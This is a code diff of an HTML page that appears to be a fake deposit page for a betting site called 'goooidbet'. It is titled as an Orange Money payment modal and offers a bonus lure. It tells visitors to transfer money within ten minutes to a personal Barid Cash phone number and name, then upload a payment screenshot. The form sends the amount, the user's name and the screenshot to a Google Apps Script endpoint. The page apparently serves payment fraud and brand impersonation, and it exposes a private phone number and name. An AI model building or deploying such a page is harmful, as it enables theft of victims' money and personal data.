@@ -1,142 +1,869 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="fr">
 <head>
   <meta charset="UTF-8">
-  <title>new/fr/office/cp3bb27760</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@500;700&display=swap" rel="stylesheet">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Orange Money Payment Modal</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  
   <style>
-    body {
+    * {
+      box-sizing: border-box;
       margin: 0;
-      font-family: 'Tajawal', sans-serif;
-      background: #f0f0f0;
-      min-height: 100vh;
-      overflow: hidden;
+      padding: 0;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
     }
 
-    header {
-      background: #fff;
-      padding: 16px;
+    body {
+      background-color: #f0f2f5;
       display: flex;
       justify-content: center;
       align-items: center;
-      gap: 10px;
-      width: 100%;
-      border-bottom: 1px solid #eee;
-      box-shadow: 0 1px 4px rgba(0,0,0,0.05);
+      min-height: 100vh;
+      padding: 12px;
+      position: relative;
+    }
+
+    /* Header Bar From First Code */
+    .header-bar {
       position: fixed;
       top: 0;
       left: 0;
+      background-color: #202d3d;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 8px 12px;
+      width: 100%;
+      height: 56px;
+      border-bottom: 1px solid #2a3a4e;
       z-index: 1000;
     }
-
-    .idbet {
-      color: #e50914;
-      font-weight: bold;
-      font-size: 1.25rem;
+    .left-section, .right-section {
+      display: flex;
+      align-items: center;
     }
-
-    .separator {
-      color: #ccc;
+    .left-section { gap: 8px; }
+    .right-section { gap: 6px; }
+    .gooo-logo {
+      text-decoration: none;
+      font-size: 22px;
+      font-weight: 800;
+      letter-spacing: -0.8px;
+      line-height: 1;
+      white-space: nowrap;
     }
-
-    .slogan {
-      color: #444;
-      font-size: 0.95rem;
-      font-weight: 500;
+    .gooo-logo .part-gooo { color: #2fb5f3; }
+    .gooo-logo .part-idbet { color: #ffffff; }
+    .flag-skew {
+      width: 24px;
+      height: 16px;
+      background-color: #c8102e;
+      transform: skewX(-12deg);
+      border-radius: 2px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
     }
-
-    .popup-wrapper {
-      position: fixed;
-      top: 50%;
+    .flag-star {
+      width: 9px;
+      height: 9px;
+      transform: skewX(12deg);
+    }
+    .gift-btn {
+      position: relative;
+      width: 38px;
+      height: 38px;
+      background-color: #2b5278;
+      border-radius: 10px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      text-decoration: none;
+      flex-shrink: 0;
+      border: none;
+      cursor: pointer;
+    }
+    .gift-icon {
+      width: 22px;
+      height: 20px;
+      position: relative;
+    }
+    .gift-lid {
+      width: 22px;
+      height: 5px;
+      background-color: #ffffff;
+      border-radius: 2px;
+      position: absolute;
+      top: 0;
+      left: 0;
+    }
+    .gift-bow {
+      position: absolute;
+      top: -4px;
       left: 50%;
-      transform: translate(-50%, -50%);
+      transform: translateX(-50%);
+      width: 10px;
+      height: 4px;
+      border: 1.5px solid #ffffff;
+      border-bottom: none;
+      border-radius: 5px 5px 0 0;
+    }
+    .gift-box {
+      width: 18px;
+      height: 14px;
+      background-color: #ffffff;
+      border-radius: 0 0 2px 2px;
+      position: absolute;
+      bottom: 0;
+      left: 2px;
+    }
+    .gift-ribbon {
+      width: 4px;
+      height: 100%;
+      background-color: #2b5278;
+      position: absolute;
+      left: 50%;
+      transform: translateX(-50%);
+      top: 0;
+    }
+    .gift-badge {
+      position: absolute;
+      top: -3px;
+      right: -3px;
+      background-color: #8cc63f;
+      color: #ffffff;
+      font-size: 10px;
+      font-weight: 700;
+      width: 16px;
+      height: 16px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    
+    /* Header Refresh Button Style */
+    .btn-deposit {
+      background-color: #2b5278;
+      color: #ffffff;
+      text-decoration: none;
+      width: 38px;
+      height: 38px;
+      border-radius: 10px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+      border: none;
+      cursor: pointer;
+      transition: background-color 0.2s ease;
+    }
+    .btn-deposit:hover {
+      background-color: #356392;
+    }
+    .btn-deposit svg {
+      width: 20px;
+      height: 20px;
+      fill: #7890a8;
+      transition: transform 0.4s ease;
+    }
+    /* تأثير دوران الأيقونة بلطف عند تمرير الماوس */
+    .btn-deposit:hover svg {
+      transform: rotate(180deg);
+      fill: #ffffff;
+    }
+
+    /* Modal Main Container */
+    .payment_modal {
+      background-color: #f4f6f8;
       width: 100%;
-      max-width: 340px;
-      z-index: 999;
+      max-width: 390px;
+      border-radius: 2px;
+      overflow: hidden;
+      box-shadow: 0 8px 25px rgba(0, 0, 0, 0.25);
+      color: #0d1b3e;
+      position: relative;
+      margin-top: 40px;
     }
 
-    .popup-card {
-      background: #fff;
-      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
-      border-radius: 0;
-    }
-
-    .popup-header {
-      background: #fff;
-      padding: 30px 16px 20px;
+    /* Header Section */
+    .modal-header-container {
+      background-color: #ffffff;
+      padding: 20px 20px 16px 20px;
       text-align: center;
       position: relative;
     }
 
-    .popup-header img {
-      max-width: 70px;
-      height: auto;
-    }
-
-    .close-btn {
-      position: absolute;
-      top: 10px;
-      right: 10px;
-      font-size: 22px;
-      color: #aaa;
-      text-decoration: none;
-      font-weight: bold;
-      transition: color 0.2s ease;
-    }
-
-    .close-btn:hover {
-      color: #000;
-    }
-
-    .popup-footer {
-      background: #eeeeee;
-      padding: 20px 18px;
-      text-align: center;
-      font-size: 16px;
-      color: #333;
-      font-weight: 500;
-      border-top: 1px solid #ddd;
-    }
-
-    .telegram-btn {
+    .payment-cell__img {
+      height: 42px;
+      object-fit: contain;
       display: inline-block;
-      margin-top: 10px;
-      background-color: #0088cc;
-      color: white;
-      padding: 10px 18px;
-      border-radius: 6px;
-      text-decoration: none;
-      font-weight: bold;
-      font-size: 15px;
     }
 
-    .telegram-btn:hover {
-      background-color: #0077b3;
+    /* Close Button (X) */
+    .modal-payment__close {
+      position: absolute;
+      top: 12px;
+      right: 14px;
+      width: 20px;
+      height: 20px;
+      cursor: pointer;
+      opacity: 0.3;
+      transition: opacity 0.2s ease;
+    }
+
+    .modal-payment__close:hover {
+      opacity: 0.7;
+    }
+
+    .modal-payment__close::before,
+    .modal-payment__close::after {
+      content: '';
+      position: absolute;
+      top: 9px;
+      left: 1px;
+      width: 18px;
+      height: 2px;
+      background-color: #555555;
+    }
+
+    .modal-payment__close::before { transform: rotate(45deg); }
+    .modal-payment__close::after { transform: rotate(-45deg); }
+
+    /* Modal Body Section */
+    .payment_modal_body {
+      padding: 18px;
+    }
+
+    /* Notice Text Paragraph */
+    .notice-text {
+      font-size: 14.5px;
+      color: #0d1b3e;
+      line-height: 1.35;
+      margin-bottom: 14px;
+      font-weight: 400;
+      text-align: left;
+    }
+
+    /* Info Lines (Beneficiary & Account Number) */
+    .info-line {
+      font-size: 14.5px;
+      color: #0d1b3e;
+      margin-bottom: 10px;
+      display: flex;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 4px;
+      line-height: 1.3;
+      text-align: left;
+    }
+
+    .info-line strong {
+      font-weight: 700;
+    }
+
+    .info-line .value-text {
+      font-weight: 400;
+    }
+
+    /* Copy Button SVG */
+    .copy-btn {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      margin-left: 2px;
+      vertical-align: middle;
+    }
+
+    .copy-btn svg {
+      width: 18px;
+      height: 18px;
+      fill: #82af2b;
+    }
+
+    .toast-copied {
+      font-size: 12px;
+      color: #15803d;
+      font-weight: 600;
+      display: none;
+      margin-left: 4px;
+    }
+
+    /* Form Layout Grid */
+    .form-grid {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      margin-top: 8px;
+    }
+
+    .form-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .field-label {
+      font-size: 13.5px;
+      font-weight: 700;
+      color: #0d1b3e;
+      flex: 1;
+      line-height: 1.3;
+      text-align: left;
+    }
+
+    .field-sublabel {
+      font-size: 11px;
+      color: #7b8896;
+      font-weight: 400;
+      margin-top: 3px;
+      text-align: left;
+    }
+
+    /* Input Controls */
+    .input-control {
+      width: 175px;
+      height: 34px;
+      border: 1px solid #b2c0ce;
+      border-radius: 2px;
+      padding: 0 8px;
+      font-size: 14px;
+      background: #ffffff;
+      outline: none;
+      color: #0d1b3e;
+    }
+
+    .input-control.amount {
+      text-align: center;
+      font-size: 14.5px;
+      font-weight: 400;
+    }
+
+    .input-control:focus {
+      border-color: #111b4e;
+    }
+
+    .input-control.error {
+      border-color: #ff4d4d !important;
+      background-color: #fff8f8 !important;
+    }
+
+    /* Upload Area & Preview Box */
+    .upload-container {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      flex-shrink: 0;
+    }
+
+    .file-preview-card {
+      width: 58px;
+      height: 58px;
+      border: 1px solid #b2c0ce;
+      border-radius: 2px;
+      overflow: hidden;
+      background: #ffffff;
+      display: none;
+      position: relative;
+    }
+
+    .file-preview-card img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+    }
+
+    .remove-file-btn {
+      position: absolute;
+      top: 2px;
+      right: 2px;
+      width: 18px;
+      height: 18px;
+      background-color: rgba(0, 0, 0, 0.6);
+      color: #ffffff;
+      border-radius: 50%;
+      font-size: 11px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      line-height: 1;
+      transition: background-color 0.2s;
+    }
+
+    .remove-file-btn:hover {
+      background-color: rgba(255, 0, 0, 0.8);
+    }
+
+    .upload-box {
+      width: 58px;
+      height: 58px;
+      background-color: #c4cad1;
+      border: 2px solid #ffffff;
+      border-radius: 2px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      font-size: 30px;
+      color: #ffffff;
+      font-weight: 300;
+      user-select: none;
+      box-shadow: 0 0 0 1px #b2c0ce;
+      transition: background-color 0.2s ease;
+    }
+
+    .upload-box:hover {
+      background-color: #b0b7c1;
+    }
+
+    .upload-box.error {
+      border-color: #ff4d4d !important;
+      box-shadow: 0 0 0 1px #ff4d4d !important;
+    }
+
+    /* Confirm Button */
+    .btn-confirm {
+      width: 100%;
+      height: 44px;
+      background-color: #111b4e;
+      color: #ffffff;
+      border: none;
+      border-radius: 2px;
+      font-size: 15px;
+      font-weight: 700;
+      text-transform: uppercase;
+      cursor: pointer;
+      margin-top: 14px;
+      letter-spacing: 0.5px;
+      transition: background-color 0.2s ease;
+    }
+
+    .btn-confirm:hover {
+      background-color: #0b1235;
+    }
+
+    .wave-loader {
+      display: none;
+      justify-content: center;
+      margin-top: 12px;
+      gap: 6px;
+      height: 20px;
+    }
+    .wave-loader .dot {
+      width: 6px;
+      height: 6px;
+      border-radius: 50%;
+      background: #111b4e;
+      animation: wave 1.2s infinite ease-in-out;
+    }
+    .wave-loader .dot:nth-child(1) { animation-delay: 0s; }
+    .wave-loader .dot:nth-child(2) { animation-delay: 0.1s; }
+    .wave-loader .dot:nth-child(3) { animation-delay: 0.2s; }
+    .wave-loader .dot:nth-child(4) { animation-delay: 0.3s; }
+    .wave-loader .dot:nth-child(5) { animation-delay: 0.4s; }
+    @keyframes wave {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-6px); }
+    }
+
+    /* Gift Popup Modal Styles */
+    .gift-popup-overlay {
+        display: none;
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background-color: rgba(0, 0, 0, 0.75);
+        z-index: 2000;
+        align-items: center;
+        justify-content: center;
+        padding: 20px;
+    }
+    .gift-popup-overlay.open {
+        display: flex;
+    }
+    .gift-popup-card {
+        background: linear-gradient(145deg, #202d3d, #17212e);
+        border: 1px solid #2a3a4e;
+        border-radius: 16px;
+        width: 100%;
+        max-width: 380px;
+        padding: 25px 20px;
+        text-align: center;
+        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+        position: relative;
+        animation: popupScale 0.3s ease;
+    }
+    @keyframes popupScale {
+        from { transform: scale(0.8); opacity: 0; }
+        to { transform: scale(1); opacity: 1; }
+    }
+    .gift-popup-icon {
+        width: 64px;
+        height: 64px;
+        background-color: rgba(140, 198, 63, 0.15);
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        margin: 0 auto 15px auto;
+        color: #8cc63f;
+        font-size: 28px;
+        box-shadow: 0 0 15px rgba(140, 198, 63, 0.2);
+    }
+    .gift-popup-title {
+        font-size: 20px;
+        font-weight: 700;
+        color: #ffffff;
+        margin-bottom: 10px;
+    }
+    .gift-popup-desc {
+        font-size: 14px;
+        color: #8a9cb0;
+        line-height: 1.6;
+        margin-bottom: 20px;
+    }
+    .gift-popup-desc strong {
+        color: #8cc63f;
+    }
+    .gift-popup-btn {
+        background-color: #8cc63f;
+        color: #ffffff;
+        border: none;
+        width: 100%;
+        padding: 12px;
+        border-radius: 8px;
+        font-size: 15px;
+        font-weight: 600;
+        cursor: pointer;
+        transition: background 0.2s;
+    }
+    .gift-popup-btn:hover {
+        background-color: #7db335;
     }
   </style>
 </head>
 <body>
 
-  <header>
-    <span class="idbet">idbet</span>
-    <span class="separator">|</span>
-    <span class="slogan">وكيل شحن</span>
-  </header>
-
-  <div class="popup-wrapper">
-    <div class="popup-card">
-      <div class="popup-header">
-        <a href="recharge.html" class="close-btn" rel="noopener noreferrer">×</a>
-        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo" referrerpolicy="no-referrer">
-      </div>
-      <div class="popup-footer">
-        لإتمام طلب الإيداع، يُرجى التواصل معنا عبر تيليجرام.
-        <br>
-        <a class="telegram-btn" href="https://t.me/gooidbetcom" target="_blank" rel="noopener noreferrer">تواصل معنا الآن</a>
-      </div>
+<header class="header-bar">
+    <div class="left-section">
+        <a href="#" class="gooo-logo">
+            <span class="part-gooo">gooo</span><span class="part-idbet">idbet</span>
+        </a>
+        <div class="flag-skew">
+            <svg class="flag-star" viewBox="0 0 100 100">
+                <polygon points="50,5 64,36 98,36 70,57 81,91 50,70 19,91 30,57 2,36 36,36" fill="none" stroke="#006233" stroke-width="8"/>
+            </svg>
+        </div>
     </div>
+    <div class="right-section">
+        <button type="button" class="gift-btn" id="giftBtnMain" aria-label="Bonus">
+            <div class="gift-icon">
+                <div class="gift-bow"></div>
+                <div class="gift-lid"></div>
+                <div class="gift-box"><div class="gift-ribbon"></div></div>
+            </div>
+            <span class="gift-badge">1</span>
+        </button>
+        <!-- زر التحديث (إعادة تحميل الصفحة مباشرة عند الضغط عليه بدون أي ألوان حمراء) -->
+        <button type="button" class="btn-deposit" id="depositBtnRefresh" aria-label="Rafraîchir la page">
+            <svg viewBox="0 0 24 24">
+                <path d="M12 4V1L8 5l4 4V6c3.31 0 6 2.69 6 6 0 1.01-.25 1.97-.7 2.8l1.46 1.46C19.54 15.03 20 13.57 20 12c0-4.42-3.58-8-8-8zm0 14c-3.31 0-6-2.69-6-6 0-1.01.25-1.97.7-2.8L5.24 7.74C4.46 8.97 4 10.43 4 12c0 4.42 3.58 8 8 8v3l4-4-4-4v3z"/>
+            </svg>
+        </button>
+    </div>
+</header>
+
+  <div class="payment_modal" id="paymentModalContainer">
+    
+    <!-- Modal Header -->
+<div class="modal-header-container">
+<span class="modal-payment__close" onclick="history.back()"></span>
+<a href="" target="_blank">
+  <img src="https://i.ibb.co/6RPXyf6X/IMG-6384.png" alt="IMG 6384" class="payment-cell__img" border="0">
+</a>
+</div>
+
+    <!-- Modal Body -->
+    <div class="payment_modal_body">
+      <form id="transferForm">
+        
+        <!-- Notice Text -->
+        <div class="notice-text">
+          Avant de créer une demande, transférez les fonds dans un délai de 10 minutes en utilisant les informations de paiement fournies ci-dessous.
+        </div>
+
+        <!-- Beneficiary Line -->
+        <div class="info-line" style="margin-bottom: 12px;">
+          <strong>Barid Cash compte / حساب بريد كاش رقم الموبايل</strong> 
+          <span class="value-text" id="accountNumber">0719806093 </span>
+          <span class="copy-btn" title="Copier" onclick="copyData('0719806093', this)">
+            <svg viewBox="0 0 24 24"><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/></svg>
+          </span>
+          <span class="toast-copied">Copié</span>
+        </div>
+
+        <!-- Account Number Line -->
+        <div class="info-line" style="margin-bottom: 12px;">
+          <strong>Motif / السبب</strong> 
+          <span class="value-text" id="accountNumber">Service </span>
+          <span class="copy-btn" title="Copier" onclick="copyData('Service', this)">
+            <svg viewBox="0 0 24 24"><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/></svg>
+          </span>
+          <span class="toast-copied">Copié</span>
+        </div>
+      <div class="info-line" style="margin-bottom: 12px;">
+          <strong>Nom / الإسم العائلي </strong> 
+          <span class="value-text" id="accountNumber">EL FadIi </span>
+          <span class="copy-btn" title="Copier" onclick="copyData('EL FadIi', this)">
+            <svg viewBox="0 0 24 24"><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/></svg>
+          </span>
+          <span class="toast-copied">Copié</span>
+        </div>
+        <div class="info-line" style="margin-bottom: 12px;">
+          <strong>Prénom / الإسم الشخصي</strong> 
+          <span class="value-text" id="accountNumber">Yasmine </span>
+          <span class="copy-btn" title="Copier" onclick="copyData('Yasmine', this)">
+            <svg viewBox="0 0 24 24"><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/></svg>
+          </span>
+        <!-- Form Fields Grid -->
+        <div class="form-grid">
+          
+          <!-- Montant Row -->
+          <div class="form-row">
+            <div class="field-label">
+              Montant (Min 100.00 MAD / Max 20 000.00 MAD):
+            </div>
+            <input id="amount" name="amount" class="input-control amount" type="number" placeholder="100.00" min="50" max="20000" required>
+          </div>
+
+          <!-- Account Number Row -->
+          <div class="form-row">
+            <div class="field-label">
+              رقم هاتف حسابك : 
+            </div>
+            <input type="text" name="bank_account" id="bank_account" value="" class="input-control" required>
+          </div>
+
+          <!-- Name Row -->
+          <div class="form-row">
+            <div class="field-label">
+              الاسم كاملا:
+            </div>
+            <input type="text" name="fullname" id="fullname" value="" class="input-control" required>
+          </div>
+
+          <!-- Screenshot Upload Row -->
+          <div class="form-row" style="align-items: flex-start;">
+            <div class="field-label">
+Screenshot / الصورة الخاصة بالدفع:
+              <div class="field-sublabel">
+                (.jpg, .jpeg, .png, .pdf. La taille maximale du fichier est de 20 Mo)
+              </div>
+            </div>
+
+            <div class="upload-container">
+              <div class="file-preview-card" id="file_preview_card">
+                <img id="preview_img" src="" alt="Preview">
+                <div class="remove-file-btn" title="حذف الصورة" onclick="removeFile(event)">×</div>
+              </div>
+
+              <div class="upload-box" id="upload_box_btn" onclick="document.getElementById('real_file_input').click()">
+                +
+                <input type="file" id="real_file_input" name="proof" style="display:none;" accept=".jpg,.jpeg,.png,.pdf" onchange="handleFileSelect(this)" required>
+              </div>
+            </div>
+          </div>
+
+        </div>
+
+        <!-- Confirm Button -->
+        <button type="submit" class="btn-confirm" id="deposit_button">CONFIRMER</button>
+
+        <div class="wave-loader" id="waveLoader">
+          <span class="dot"></span>
+          <span class="dot"></span>
+          <span class="dot"></span>
+          <span class="dot"></span>
+          <span class="dot"></span>
+        </div>
+
+      </form>
+    </div>
+
   </div>
+
+  <!-- Gift Popup Modal -->
+  <div class="gift-popup-overlay" id="giftPopupOverlay">
+      <div class="gift-popup-card">
+          <div class="gift-popup-icon">
+              <i class="fa-solid fa-gift"></i>
+          </div>
+          <h3 class="gift-popup-title" id="popupTitle">Welcome Bonus</h3>
+          <p class="gift-popup-desc" id="popupDesc">Get a welcome bonus for your first deposit up to <strong>5000 MAD</strong>!</p>
+          <button class="gift-popup-btn" id="giftPopupCloseBtn">OK</button>
+      </div>
+  </div>
+
+  <script>
+    document.getElementById("fullname").addEventListener("input", function () {
+      this.value = this.value.replace(/[^a-zA-Z\s]/g, '');
+    });
+
+    // تحديث / إعادة تحميل الصفحة فوراً عند الضغط على الأيقونة الجديدة في الهيدر
+    document.getElementById("depositBtnRefresh").addEventListener("click", function(e) {
+      e.preventDefault();
+      location.reload();
+    });
+
+    // Copy Text Logic
+    function copyData(text, element) {
+      navigator.clipboard.writeText(text).then(() => {
+        const toast = element.nextElementSibling;
+        if (toast && toast.classList.contains('toast-copied')) {
+          toast.style.display = 'inline';
+          setTimeout(() => { toast.style.display = 'none'; }, 1500);
+        }
+      });
+    }
+
+    // Image Preview Logic
+    function handleFileSelect(input) {
+      if (input.files && input.files[0]) {
+        const file = input.files[0];
+        const previewCard = document.getElementById('file_preview_card');
+        const previewImg = document.getElementById('preview_img');
+        const uploadBox = document.getElementById('upload_box_btn');
+
+        uploadBox.classList.remove('error');
+
+        if (file.type.startsWith('image/')) {
+          const reader = new FileReader();
+          reader.onload = function(e) {
+            previewImg.src = e.target.result;
+            previewCard.style.display = 'block';
+          };
+          reader.readAsDataURL(file);
+        } else {
+          previewImg.src = 'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="%237b8896"><path d="M14 2H6c-1.1 0-1.99.9-1.99 2L4 20c0 1.1.89 2 1.99 2H18c1.1 0 2-.9 2-2V8l-6-6zm2 16H8v-2h8v2zm0-4H8v-2h8v2zm-3-5V3.5L18.5 9H13z"/></svg>';
+          previewCard.style.display = 'block';
+        }
+      }
+    }
+
+    // Remove File Logic
+    function removeFile(event) {
+      event.stopPropagation();
+      const fileInput = document.getElementById('real_file_input');
+      const previewCard = document.getElementById('file_preview_card');
+      const previewImg = document.getElementById('preview_img');
+
+      fileInput.value = '';
+      previewImg.src = '';
+      previewCard.style.display = 'none';
+    }
+
+    async function resizeImage(file, maxWidth = 800, maxHeight = 800) {
+      return new Promise((resolve, reject) => {
+        const img = new Image();
+        const reader = new FileReader();
+        reader.onload = e => img.src = e.target.result;
+        img.onload = () => {
+          const canvas = document.createElement("canvas");
+          let width = img.width, height = img.height;
+          if (width > height && width > maxWidth) {
+            height *= maxWidth / width;
+            width = maxWidth;
+          } else if (height > maxHeight) {
+            width *= maxHeight / height;
+            height = maxHeight;
+          }
+          canvas.width = width;
+          canvas.height = height;
+          canvas.getContext("2d").drawImage(img, 0, 0, width, height);
+          canvas.toBlob(blob => resolve(blob), "image/jpeg", 0.7);
+        };
+        reader.onerror = reject;
+        reader.readAsDataURL(file);
+      });
+    }
+
+    async function blobToBase64(blob) {
+      return new Promise((resolve, reject) => {
+        const reader = new FileReader();
+        reader.onloadend = () => resolve(reader.result);
+        reader.onerror = reject;
+        reader.readAsDataURL(blob);
+      });
+    }
+
+    document.getElementById("transferForm").onsubmit = async function(e) {
+      e.preventDefault();
+      const amount = parseFloat(document.getElementById("amount").value);
+      if (amount < 50 || amount > 20000) return;
+
+      const fullname = document.getElementById("fullname").value;
+      const file = document.getElementById("real_file_input").files[0];
+      const button = document.getElementById("deposit_button");
+      if (!file) return;
+
+      document.getElementById("waveLoader").style.display = "flex";
+      button.disabled = true;
+
+      try {
+        const compressed = await resizeImage(file);
+        const imageBase64 = await blobToBase64(compressed);
+
+        const response = await fetch("https://script.google.com/macros/s/AKfycbx-RNd26M3sjNxxJ4kL0A4OUpMccV7KiTQyxEfberrFO7Qadoamg6MCohMZdFpFd7qrhw/exec", {
+          method: "POST",
+          headers: { "Content-Type": "application/x-www-form-urlencoded" },
+          body: new URLSearchParams({ amount, fullname, imageBase64 })
+        });
+
+        if (response.ok) {
+          window.location.replace("bc-recharge.html");
+        }
+      } catch (err) {
+        console.error(err);
+      } finally {
+        document.getElementById("waveLoader").style.display = "none";
+        button.disabled = false;
+      }
+    };
+
+    // Gift Popup Script
+    const giftBtnMain = document.getElementById('giftBtnMain');
+    const giftPopupOverlay = document.getElementById('giftPopupOverlay');
+    const giftPopupCloseBtn = document.getElementById('giftPopupCloseBtn');
+
+    function openGiftPopup() {
+        giftPopupOverlay.classList.add('open');
+    }
+
+    function closeGiftPopup() {
+        giftPopupOverlay.classList.remove('open');
+    }
+
+    if(giftBtnMain) {
+        giftBtnMain.addEventListener('click', openGiftPopup);
+    }
+    if(giftPopupCloseBtn) {
+        giftPopupCloseBtn.addEventListener('click', closeGiftPopup);
+    }
+    if(giftPopupOverlay) {
+        giftPopupOverlay.addEventListener('click', (e) => {
+            if (e.target === giftPopupOverlay) {
+                closeGiftPopup();
+            }
+        });
+    }
+  </script>
 
 </body>
 </html>
